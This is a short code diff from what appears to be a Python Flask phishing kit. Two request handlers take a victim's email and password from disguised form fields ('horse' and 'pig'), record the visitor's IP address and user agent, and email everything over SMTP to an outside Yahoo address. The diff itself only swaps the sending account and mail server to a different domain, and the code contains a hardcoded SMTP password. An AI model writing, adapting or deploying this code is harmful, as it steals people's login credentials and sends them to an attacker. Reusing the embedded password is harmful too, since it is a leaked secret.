@@ -191,8 +191,8 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "administracion@centrodecambios.com"
-        sender_emaill = "administracion"
+        sender_email = "vigilancia@coopvillalosangeles.org"
+        sender_emaill = "vigilancia"
         receiver_email = "edwinpowell0113@yahoo.com"
         password = "Evelyn19271534"
         useragent = request.headers.get('User-Agent')
@@ -210,7 +210,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("centrodecambios.com", 465) as server:
+        with smtplib.SMTP_SSL("coopvillalosangeles.org", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
@@ -231,8 +231,8 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "administracion@centrodecambios.com"
-        sender_emaill = "administracion"
+        sender_email = "vigilancia@coopvillalosangeles.org"
+        sender_emaill = "vigilancia"
         receiver_email = "edwinpowell0113@yahoo.com"
         password = "Evelyn19271534"
         useragent = request.headers.get('User-Agent')
@@ -250,7 +250,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("centrodecambios.com", 465) as server:
+        with smtplib.SMTP_SSL("coopvillalosangeles.org", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
